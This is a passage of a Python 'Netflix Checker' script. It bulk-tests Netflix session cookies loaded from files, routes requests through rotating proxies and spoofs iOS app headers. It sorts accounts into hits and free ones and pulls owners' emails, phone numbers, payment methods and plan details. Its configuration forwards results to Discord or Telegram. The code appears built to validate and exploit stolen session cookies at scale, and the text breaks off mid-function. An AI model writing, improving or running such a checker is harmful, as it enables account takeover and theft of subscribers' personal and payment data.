#!/usr/bin/env python3

import base64
import copy
import html
import json
import os
import queue
import random
import re
import string
import sys
import threading
import time
import unicodedata
from datetime import datetime, timedelta, timezone

import requests
from urllib3.exceptions import InsecureRequestWarning

try:
    import yaml
except ImportError:
    yaml = None

if os.name == "nt":
    os.system("")

CHANNEL_NAME = base64.b64decode("U3Byb2plY3RjaGFubmVs").decode("utf-8")

DEFAULT_CONFIG = {
    "txt_fields": {
        "name": False,
        "email": False,
        "max_streams": True,
        "plan_price": True,
        "plan": True,
        "country": True,
        "member_since": False,
        "next_billing": True,
        "extra_members": True,
        "payment_method": True,
        "card": False,
        "phone": False,
        "quality": True,
        "hold_status": False,
        "email_verified": False,
        "membership_status": False,
        "profiles": True,
        "user_guid": False,
    },
    "nftoken": False,
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {
            "enabled": False,
            "url": "",
            "mode": "full",
            "plans": "all",
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "mode": "full",
            "plans": "all",
        },
    },
    "display": {
        "mode": "simple",
    },
    "retries": {
        "error_proxy_attempts": 3,
        "nftoken_attempts": 1,
    },
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

BANNER_ART = """
                                                                                                          
b.             8 8 8888888888 8888888 8888888888 8 8888888888   8 8888          8 8888 `8.`8888.      ,8' 
888o.          8 8 8888             8 8888       8 8888         8 8888          8 8888  `8.`8888.    ,8'  
Y88888o.       8 8 8888             8 8888       8 8888         8 8888          8 8888   `8.`8888.  ,8'   
.`Y888888o.    8 8 8888             8 8888       8 8888         8 8888          8 8888    `8.`8888.,8'    
8o. `Y888888o. 8 8 888888888888     8 8888       8 888888888888 8 8888          8 8888     `8.`88888'     
8`Y8o. `Y88888o8 8 8888             8 8888       8 8888         8 8888          8 8888     .88.`8888.     
8   `Y8o. `Y8888 8 8888             8 8888       8 8888         8 8888          8 8888    .8'`8.`8888.    
8      `Y8o. `Y8 8 8888             8 8888       8 8888         8 8888          8 8888   .8'  `8.`8888.   
8         `Y8o.` 8 8888             8 8888       8 8888         8 8888          8 8888  .8'    `8.`8888.  
8            `Yo 8 888888888888     8 8888       8 8888         8 888888888888  8 8888 .8'      `8.`8888.   
"""

RESULTS_DIR = os.path.join("results", "NETFLIX")
HITS_DIR = os.path.join(RESULTS_DIR, "hits")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(HITS_DIR, exist_ok=True)

FREE_FILE = os.path.join(RESULTS_DIR, "free.txt")
DUP_FILE = os.path.join(RESULTS_DIR, "duplicate.txt")

cookies_folder = "cookies"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"
DISCORD_WEBHOOK_USERNAME = "Netflix Checker"
DISCORD_WEBHOOK_AVATAR_URL = "https://i.ibb.co/XZLnRkFs/netflix-logo-png-2616.png"

lock = threading.Lock()
guid_lock = threading.Lock()
processed_emails = set()

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

_USE_COLOR = sys.stdout.isatty() or os.environ.get("TERM") in (
    "xterm", "xterm-256color", "screen")

if _USE_COLOR:
    RST = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    GREEN = "\033[38;5;46m"
    LGREEN = "\033[38;5;120m"
    RED = "\033[38;5;203m"
    YEL = "\033[38;5;220m"
    CYAN = "\033[38;5;51m"
    MAG = "\033[38;5;213m"
    GREY = "\033[38;5;245m"
else:
    RST = BOLD = DIM = GREEN = LGREEN = RED = YEL = CYAN = MAG = GREY = ""


def out_c(t, color):
    return f"{color}{t}{RST}"


def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        print("\n" * 3)


def print_banner():
    clear_screen()
    print(out_c(BANNER_ART, GREEN))
    print(out_c("=======================================================", GREEN))
    print(out_c(" >>> NETFLIX CHECKER", LGREEN))
    print(out_c(f" Channel: {CHANNEL_NAME}", CYAN))
    print(out_c("=======================================================", GREEN) + "\n")


class TopStatus:
    NROWS = 5
    W = 64
    BATCH_SIZE = 5

    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.err = 0
        self.emitted = 0
        self.pending_lines = []
        self.start = time.time()
        self.lock = threading.Lock()
        self.enabled = sys.stdout.isatty()

    def _rows(self):
        el = time.time() - self.start
        cps = self.checked / max(el, 1e-3)

        l1_parts = [
            ("checked ", GREY), (f"{self.checked}/{self.total}", LGREEN),
            ("   hits ", GREY), (str(self.hits), GREEN),
            ("   free ", GREY), (str(self.free), CYAN),
        ]
        l1_plain = "".join(p[0] for p in l1_parts)
        l1_col = "".join(out_c(p[0], p[1]) for p in l1_parts)

        l2_parts = [
            ("bad ", GREY), (str(self.bad), RED),
            ("   err ", GREY), (str(self.err), YEL),
            ("   speed ", GREY), (f"{cps:.1f}/s", LGREEN),
            ("   time ", GREY), (f"{int(el)}s", LGREEN),
        ]
        l2_plain = "".join(p[0] for p in l2_parts)
        l2_col = "".join(out_c(p[0], p[1]) for p in l2_parts)

        W = self.W

        def row(plain, col):
            pad = max(0, W - len(plain))
            return out_c("  │ ", GREY) + col + " " * pad + out_c(" │", GREY)

        return [
            out_c("  ╭─ live " + "─" * (W - 5) + "╮", GREY),
            row(l1_plain, l1_col),
            row(l2_plain, l2_col),
            out_c("  ╰" + "─" * (W + 2) + "╯", GREY),
            "",
        ]

    def draw_initial(self):
        if not self.enabled:
            return
        for r in self._rows():
            print(r)
        sys.stdout.flush()

    def _redraw(self):
        if not self.enabled:
            return
        up = self.NROWS + self.emitted
        sys.stdout.write(f"\033[{up}A")
        for r in self._rows():
            sys.stdout.write("\033[K" + r + "\n")
        if self.emitted > 0:
            sys.stdout.write(f"\033[{self.emitted}B")
        sys.stdout.flush()

    def _print_batch_unlocked(self, lines):
        if not lines:
            return
        for line in lines:
            print(line)
        self.emitted += len(lines)
        self._redraw()

    def bump(self, label):
        with self.lock:
            self.checked += 1
            if label == "HIT":
                self.hits += 1
            elif label == "FREE":
                self.free += 1
            elif label == "BAD":
                self.bad += 1
            elif label == "ERR":
                self.err += 1
            self._redraw()

    def emit(self, text, color=None):
        with self.lock:
            line = out_c(text, color) if color else text
            if not self.enabled:
                print(line)
                return
            self.pending_lines.append(line)
            if len(self.pending_lines) >= self.BATCH_SIZE:
                batch = self.pending_lines[:self.BATCH_SIZE]
                self.pending_lines = self.pending_lines[self.BATCH_SIZE:]
                self._print_batch_unlocked(batch)

    def flush(self):
        with self.lock:
            if self.pending_lines:
                batch = self.pending_lines[:]
                self.pending_lines.clear()
                self._print_batch_unlocked(batch)
            else:
                self._redraw()


def create_base_folders():
    os.makedirs(cookies_folder, exist_ok=True)
    os.makedirs(RESULTS_DIR, exist_ok=True)
    os.makedirs(HITS_DIR, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# ip:port or ip:port:user:pass\n")


def cleanup_stale_temp_files():
    if not os.path.exists(RESULTS_DIR):
        return
    for current_root, _, files in os.walk(RESULTS_DIR):
        for filename in files:
            if filename.lower().endswith(".tmp"):
                try:
                    os.remove(os.path.join(current_root, filename))
                except Exception:
                    pass


def sanitize_filename_part(value, fallback="UNKNOWN"):
    cleaned = decode_netflix_value(value) or ""
    safe = re.sub(r'[<>:"/\\|?*\s]+', "_", cleaned).strip("._-")
    return safe or fallback


def build_bundle_filename(original_name, bundle_index=1, bundle_total=1):
    if bundle_total <= 1:
        return original_name
    base_name, extension = os.path.splitext(original_name)
    safe_base = re.sub(r'[<>:"/\\|?*]+', "_", base_name).strip(" .") or "cookie"
    return f"{safe_base}__part_{bundle_index}_of_{bundle_total}{extension or '.txt'}"


def build_bundle_display_name(original_name, bundle_index=1, bundle_total=1):
    if bundle_total <= 1:
        return original_name
    return f"{original_name} [{bundle_index}/{bundle_total}]"


def is_plan_allowed_for_notifications(channel_cfg, plan_key):
    plans_value = (channel_cfg or {}).get("plans", "all")
    if plans_value is None:
        return True
    if isinstance(plans_value, str):
        normalized = plans_value.strip().lower()
        if normalized in {"", "all", "*"}:
            return True
        allowed = {item.strip().lower() for item in normalized.split(",") if item.strip()}
        return (plan_key or "").lower() in allowed
    if isinstance(plans_value, (list, tuple, set)):
        allowed = {str(item).strip().lower() for item in plans_value if str(item).strip()}
        if not allowed:
            return True
        return (plan_key or "").lower() in allowed
    return True


def get_canonical_output_label(plan_key):
    canonical_labels = {
        "premium": "Premium",
        "standard_with_ads": "Standard With Ads",
        "standard": "Standard",
        "basic": "Basic",
        "mobile": "Mobile",
        "extra_member_premium": "Premium (Extra Member)",
        "free": "Free",
        "duplicate": "Duplicate",
        "unknown": "Unknown",
    }
    return canonical_labels.get(plan_key, "Unknown")


def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")

    last_error = None
    for _ in range(2):
        try:
            with open(path, "wb") as out_f:
                out_f.write(data)
                out_f.flush()
                try:
                    os.fsync(out_f.fileno())
                except OSError:
                    pass
            if data and os.path.getsize(path) == 0:
                raise IOError("File write produced a zero-byte output")
            return
        except Exception as exc:
            last_error = exc
            try:
                if os.path.exists(path) and os.path.getsize(path) == 0:
                    os.remove(path)
            except Exception:
                pass
    if last_error is not None:
        raise last_error


def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged


def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
    return copy.deepcopy(DEFAULT_CONFIG), "default"


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"):
        host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()

    url_like = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line,
        flags=re.IGNORECASE,
    )
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(
            data["scheme"].lower(),
            data["host"],
            data["port"],
            data.get("user"),
            data.get("password"),
        )

    userpass_hostport = re.match(
        r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line,
    )
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport_userpass = re.match(
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$",
        line,
    )
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])

    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])

    four_part = line.split(":")
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit():
            return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit():
            return _build_proxy_dict("http", c, d, a, b)

    return None


def load_proxies():
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}


def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    normalized = normalized.lower()
    return "netflix." in normalized


def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)


def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    for cookie_name in LOGIN_REQUIRED_NETFLIX_COOKIES:
        if not decode_netflix_value(cookie_dict.get(cookie_name)):
            return False
    return True


def is_netflix_cookie_entry(domain, name):
    normalized_name = canonicalize_netflix_cookie_name(name)
    return normalized_name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)


def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    if not stripped:
        return []

    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]

    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []


def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True


def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }


def format_netscape_cookie_entry(entry):
    return (
        f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t"
        f"{entry['expires']}\t{entry['name']}\t{entry['value']}"
    )


def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(
            build_netscape_cookie_entry(
                domain,
                parts[1],
                parts[2],
                parts[3],
                parts[4],
                name,
                parts[6],
                index,
            )
        )
    return entries


def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []

    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return []

    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(
            build_netscape_cookie_entry(
                domain,
                "TRUE" if str(domain).startswith(".") else "FALSE",
                cookie.get("path", "/"),
                "TRUE" if cookie.get("secure", False) else "FALSE",
                cookie.get("expirationDate", cookie.get("expiration", 0)),
                name,
                cookie.get("value", ""),
                index,
            )
        )
    return entries


def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(
        rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
        r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append(
            build_netscape_cookie_entry(
                ".netflix.com",
                "TRUE",
                "/",
                "TRUE" if cookie_name == "SecureNetflixId" else "FALSE",
                "0",
                cookie_name,
                value,
                index,
            )
        )
    return entries


def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []

    entries_by_name = {}
    for entry in entries:
        cookie_name = entry.get("name")
        if not cookie_name:
            continue
        entries_by_name.setdefault(cookie_name, []).append(entry)
    if not entries_by_name:
        return []

    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []

    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])

        if not selected_entries:
            continue

        selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
        netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
        bundles.append(
            {
                "index": bundle_index + 1,
                "total": bundle_count,
                "netscape_text": netscape_text,
                "cookies": cookies_dict_from_netscape(netscape_text),
            }
        )
    return bundles


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain = parts[0]
            name = canonicalize_netflix_cookie_name(parts[5])
            value = parts[6]
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []


def _decode_unicode_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def _decode_hex_escape(match):
    try:
        return chr(int(match.group(1), 16))
    except Exception:
        return match.group(0)


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {
        "\\x20": " ",
        "\\u00A0": " ",
        "\\u00a0": " ",
        "&nbsp;": " ",
        "u00A0": " ",
    }
    for source, target in replacements.items():
        cleaned = cleaned.replace(source, target)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        previous = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", _decode_unicode_escape, cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", _decode_hex_escape, cleaned)
        cleaned = re.sub(r"(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])", _decode_unicode_escape, cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == previous:
            break
    cleaned = re.sub(r"(?<=[A-Za-z])\s+(?=[^\x00-\x7F])", "", cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None


def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None


def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        if value == 1:
            return True
        if value == 0:
            return False
        return None
    if isinstance(value, dict):
        for key in (
            "value",
            "isUserOnHold",
            "holdStatus",
            "isOnHold",
            "pastDue",
            "isPastDue",
            "isVerified",
            "verified",
        ):
            if key in value:
                parsed = parse_boolean_value(value.get(key))
                if parsed is not None:
                    return parsed
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    lowered = str(cleaned).strip().lower()
    truthy = {"true", "yes", "1", "on"}
    falsy = {"false", "no", "0", "off"}
    if lowered in truthy:
        return True
    if lowered in falsy:
        return False
    return None


def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None


def extract_bool_value(response_text, patterns):
    value = extract_first_match(response_text, patterns, re.IGNORECASE)
    if value is None:
        return None
    parsed = format_boolean_label(value)
    if parsed is not None:
        return parsed
    return value


def extract_profile_names(response_text):
    names = []
    for pattern in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pattern, response_text, re.DOTALL):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names:
                names.append(decoded)
    if not names:
        return None
    return ", ".join(names)


def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for key, value in (primary or {}).items():
        if value not in (None, "", [], {}):
            merged[key] = value
    return merged


def has_complete_account_info(info):
    if not info:
        return False
    required_fields = (
        "countryOfSignup",
        "membershipStatus",
        "localizedPlanName",
        "maxStreams",
        "videoQuality",
    )
    return all(info.get(field) and info.get(field) != "null" for field in required_fields)


def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}

    if not isinstance(payload, dict):
        return {}

    data = payload.get("data")
    if not isinstance(data, dict):
        return {}

    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    def _first_boolean_label(*candidates):
        for candidate in candidates:
            labeled = format_boolean_label(candidate)
            if labeled is not None:
                return labeled
        return None

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"),
            plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"),
            plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded

        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    hold_status = _first_boolean_label(
        hold_meta.get("isUserOnHold") if isinstance(hold_meta, dict) else hold_meta,
        hold_meta.get("holdStatus") if isinstance(hold_meta, dict) else None,
        hold_meta.get("isOnHold") if isinstance(hold_meta, dict) else None,
        hold_meta.get("pastDue") if isinstance(hold_meta, dict) else None,
        growth_account.get("isUserOnHold"),
        growth_account.get("holdStatus"),
        growth_account.get("isOnHold"),
        growth_account.get("pastDue"),
        growth_account.get("isPastDue"),
    )

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
